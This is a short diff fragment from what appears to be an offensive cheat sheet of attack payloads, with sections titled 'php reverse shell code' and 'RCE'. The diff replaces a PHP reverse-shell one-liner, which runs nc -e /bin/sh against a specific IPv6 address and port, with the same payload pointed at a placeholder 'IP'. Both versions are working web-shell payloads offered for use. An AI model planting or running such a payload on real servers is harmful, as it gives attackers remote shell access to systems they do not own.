@@ -84,7 +84,7 @@ OR
 
 ############################
 php reverse shell code:-
-<?passthru("nc -e /bin/sh 2405:204:9212:2636:d54a:4d49:d0f3:3a3c 1234");?>
+<?passthru("nc -e /bin/sh IP 1234");?>
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 RCE
